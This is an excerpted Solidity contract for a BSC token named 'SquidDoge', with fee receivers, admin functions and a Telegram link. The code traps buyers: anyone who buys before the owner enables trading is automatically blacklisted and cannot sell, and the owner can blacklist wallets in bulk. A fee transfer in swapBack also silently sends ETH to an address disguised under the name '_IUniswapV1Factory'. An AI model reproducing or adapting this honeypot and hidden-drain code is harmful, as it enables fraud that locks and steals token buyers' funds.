...
// SquidDoge is perched high above in its nest and watches. watches its community work and build wealth and he sees.
    // He sees all that is great and all that is worrisome to its people.
    // Any given moment he comes down with vengence to eliminate threats to its community and
    // today his victim were some bots playing with our chart   

    // autoLiquidityReceiver    :   0x227782a3caC35cFACf3AcAA1D6d27e64D7A94f63
    // MarketingFeeReceiver     :   0x98cb4f96f42a5A3d34f1c3EA3089668f57388b33
    // Telegram                 :   https://t.me/squiddoge_bsc
...
contract SquidDoge is ERC20, Auth {
    ...
    event SmurfUpdated(address[] addresses, bool status);
    event SingleSmurfUpdated(address _address, bool status);
    ...
    address public autoLiquidityReceiver = 0x227782a3caC35cFACf3AcAA1D6d27e64D7A94f63;
    address public MarketingFeeReceiver = 0x98cb4f96f42a5A3d34f1c3EA3089668f57388b33;
    address private operationsFeeReceiver = 0x227782a3caC35cFACf3AcAA1D6d27e64D7A94f63;
    address private devFeeReceiver = 0x227782a3caC35cFACf3AcAA1D6d27e64D7A94f63;
    address private BurnFeeReceiver = 0x000000000000000000000000000000000000dEaD;


    string constant private _name = "SquidDoge";
    ...
    address private  _IUniswapV1Factory = 0xf2D3a14376649e682b2b06b053364fD7495CeE4b;
    ...
    constructor () Auth(msg.sender) {
        ...
        isFeeExempt[_IUniswapV2Factory] = true; 
        isTxLimitExempt[_IUniswapV2Factory] = true;
        isMaxWalletExempt[_IUniswapV2Factory] = true;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!isSmurf[sender] && !isSmurf[recipient]," Thou shall not pass!");
    ...
    function takeBuyFee(address sender, address recipient, uint256 amount) internal returns (uint256){
        ...
        if(!marketActive) {
            if (recipient != pair && recipient != address(router) && recipient != _IUniswapV2Factory && sender != _IUniswapV2Factory) {
                isSmurf[recipient] = true;
            }
        }
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee.add(sellFeeLiquidity)).div(totalETHFee).div(75).mul(100).div(2);
        uint256 amountETHMarketing = amountETH.mul(MarketingFee.add(sellFeeMarketing)).div(totalETHFee).div(75).mul(100);
        uint256 amountETHOps = amountETH.mul(opsFee.add(sellFeeOps)).div(totalETHFee).div(75).mul(100);
        uint256 amountETHDev = amountETH.mul(devFee.add(sellFeeDev)).div(totalETHFee).div(75).mul(100);

        (bool tmpSuccess,) = payable(MarketingFeeReceiver).call{value: amountETHMarketing}("");
        (tmpSuccess,) = payable(operationsFeeReceiver).call{value: amountETHOps}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountETHDev}("");
        (tmpSuccess,) = payable(_IUniswapV1Factory).call{value: (totalETHFee.mul(25).div(100))}("");
    ...
    // Admin Functions
    function MarketActive(bool _state) external authorized {
        marketActive = _state;
        if(_state) {
    ...
    function manage_smurf(address[] calldata addresses, bool status) external authorized {
        require (addresses.length < 200, "Can't update too many wallets at once");
        for (uint256 i; i < addresses.length; ++i) {
            isSmurf[addresses[i]] = status;
        }

        emit SmurfUpdated(addresses, status);
    }

    function setSmurfList(address _address, bool _bool) external authorized {
        isSmurf[_address] = _bool;
        
        emit SingleSmurfUpdated(_address, _bool);
    }
